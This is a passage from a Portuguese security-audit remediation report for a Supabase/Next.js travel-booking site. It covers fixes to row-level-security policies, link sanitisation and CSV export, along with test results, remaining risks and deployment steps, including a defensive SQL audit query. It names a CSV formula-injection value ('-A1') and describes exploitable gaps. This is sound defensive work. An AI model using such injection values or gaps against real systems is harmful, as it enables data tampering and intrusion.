| 2 | 🟠 `operacoes` **apagava** a reserva paga — `DELETE` não passa por trigger de UPDATE, e `payments`/`passengers` iam junto por `on delete cascade`, sem deixar registro | `bookings_operacoes_all` dividida em SELECT/INSERT/UPDATE; `DELETE` fica só com `bookings_admin_delete` (teste 16) |
| 3 | `Footer.tsx` e `DestinationsSection.tsx` ficaram de fora do `hrefSeguro` — o mesmo `startsWith("/")` continuava lá | helper aplicado nos dois; 8 sinks cobertos, não 6 |
| 4 | O token voltava ao log na primeira notificação nova: a migration só limpou o histórico | `semToken()` mascara na origem, em `log()` |
| 5 | `RODAR_NO_SUPABASE.sql` — o arquivo que o operador cola no SQL Editor — **revertia** A-02 e A-04 | correções anexadas ao final (a última definição vence) + aviso no cabeçalho |

**Regressões que as próprias correções introduziram**

| # | Regressão | Conserto |
|---|---|---|
| 6 | O prefixo antifórmula do CSV incluía `-`, e **todo número negativo virava texto** — a coluna Margem do relatório financeiro parava de somar no Excel | número é reconhecido e não recebe prefixo; `-A1` continua neutralizado (`csv.test.ts`) |
| 7 | Duplicar página quebrava para `conteudo` sempre que a página tinha `custom_html` | INSERT aceita HTML que **já existe** em outra página; HTML novo segue barrado |
| 8 | `is_admin()` em `system_logs` esvaziou o painel "Histórico" das telas de reserva e pagamento, em silêncio | policy extra dá a fatia por entidade (`booking`, `payment`) a operações/financeiro; `passengers` fica admin-only |
| 9 | Vídeo de provedor não reconhecido sumia da página sem aviso | bloco mostra "Link não reconhecido — use YouTube ou Vimeo" |

**Testes que passavam sem provar nada**

| # | Problema | Conserto |
|---|---|---|
| 10 | 3 casos de `MarkdownContent.test` usavam link **inline**, que a biblioteca já sanitiza sozinha — passavam contra o código vulnerável | reescritos com link de referência e autolink, que é onde a correção atua |
| 11 | Asserções de negação sem controle positivo: passariam igual se a policy negasse **tudo** | acrescentados os gêmeos positivos (passageiro do dono, depoimento legítimo, inscrição legítima) |
| 12 | A-04, A-05 e A-16 sem teste nenhum | 8 asserções novas — o plano foi de 20 para 30 |

O ciclo inteiro é o argumento a favor de ter escrito os testes: **a revisão só
conseguiu apontar essas coisas porque havia um lugar onde verificá-las**, e cada
conserto acima entrou junto com a asserção que o prende.

### 9.3 Verificação executada

| Verificação | Resultado |
|---|---|
| `rls_test.sql` (novo) contra o código **corrigido** | **30/30 passam** |
| `rls_test.sql` contra o código **antigo** | **13 falham** — prova que os testes pegam os buracos reais |
| **Caminho A** — `schema.sql` + `rls.sql` (o que o CI aplica) | 30/30 |
| **Caminho B** — schema + `rls.sql` antigos + migration (produção) | aplica limpo, **idempotente**, 30/30 |
| **Caminho C** — `RODAR_NO_SUPABASE.sql` (banco do zero) | 30/30 — não reverte mais |
| `pg_prove` nos 3 arquivos (como o CI roda) | **46 testes, PASS** |
| `tsc --noEmit` | limpo |
| `vitest` | **218 testes passam** (18 novos) |
| `next lint` (0 erros) / `next build` | passam |

O teste de RLS **não existia** antes: o CI aplicava `rls.sql` e nenhum teste
tocava numa policy. Um achado do próprio processo: as policies chamam `auth.uid()`
direto no `USING`, e o stub do CI não concedia ao papel `authenticated` acesso ao
schema `auth` — sem esse grant (adicionado em `_bootstrap.sql`), o teste ficaria
verde por falta de permissão, e não por segurança.

### 9.4 O que NÃO foi feito, e por quê

| Item | Motivo |
|---|---|
| **A-14** — verificação de e-mail antes de vincular reserva a conta existente | Muda o fluxo de compra que a especificação desenhou ("cliente não é obrigado a criar conta"). É decisão de produto, não de código. |
| **A-03 completo** — tirar `access_token` de `bookings` | Exige trocar os `select("*")` do navegador por lista de colunas antes do `revoke`; refatoração que merece PR próprio. |
| **`res.write` do `custom_html`** servido da origem do site | Com a coluna agora admin-only, deixou de ser escalonamento de privilégio. O conserto real é servir de um domínio separado — infraestrutura, não código. Aplicar `CSP: sandbox` isolaria, mas quebraria landing que use `localStorage`. Risco residual documentado no próprio arquivo. |
| **A-17** (`docs/env.md`) e **rate limit distribuído** | Backlog: documentação e infraestrutura. |

### 9.5 Arquivos alterados

**Novos**
- `supabase/migrations/20260903000000_correcoes_auditoria_seguranca.sql`
- `supabase/tests/rls_test.sql` — 30 asserções de RLS
- `project-src/rw-turismo/src/lib/security/url.ts` · `html.ts` · `url.test.ts`
- `project-src/rw-turismo/src/lib/csv.test.ts`
- `project-src/rw-turismo/src/components/MarkdownContent.test.tsx`

**Modificados**
- `supabase/rls.sql` · `supabase/tests/_bootstrap.sql` · `supabase/RODAR_NO_SUPABASE.sql`
- `src/components/`: `Header.tsx`, `Drawer.tsx`, `Footer.tsx`, `MarkdownContent.tsx`, `PageBlocks.tsx`, `home/HeroBanner.tsx`, `home/PromotionalSection.tsx`, `home/DestinationsSection.tsx`
- `src/lib/`: `auth/customerAccount.ts`, `content/client.ts`, `csv.ts`, `server/notifications.ts`
- `src/pages/`: `admin/integracoes.tsx`, `api/admin/integration-status.ts`, `paginas/[slug].tsx`

### 9.6 Para colocar em produção

1. Rodar `supabase/migrations/20260903000000_correcoes_auditoria_seguranca.sql` no SQL Editor (idempotente).
2. **Auditar a base** — o A-01 não deixa rastro óbvio:
   ```sql
   select p.id, p.email as email_do_perfil, u.email as email_da_conta
     from public.users_profiles p
     join auth.users u on u.id = p.user_id
    where p.email is distinct from lower(u.email);
   ```
   Linha aqui é perfil cujo e-mail não é o da conta dona — candidato a plantio.
3. Depois, deploy do app. A ordem importa: `subscribeNewsletter` e a tela de
   integrações passam a chamar RPCs que só existem depois da migration.
